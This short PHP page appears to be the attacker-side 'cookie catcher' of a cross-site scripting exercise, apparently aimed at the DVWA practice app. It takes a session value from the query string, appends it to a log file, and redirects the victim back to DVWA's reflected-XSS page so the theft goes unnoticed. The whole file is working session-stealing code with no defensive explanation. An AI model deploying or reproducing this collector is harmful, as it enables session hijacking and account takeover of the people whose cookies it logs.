<html>

	<?php
		$session = $_GET['session'];
		$session_file = fopen("session_file.txt", "a");
		fwrite($session_file, $session."\n");
		fclose($session_file);
	?>

	<script>
		window.location.replace("http:/\/dvwa/dvwa/vulnerabilities/xss_r/");
	</script>

</html>
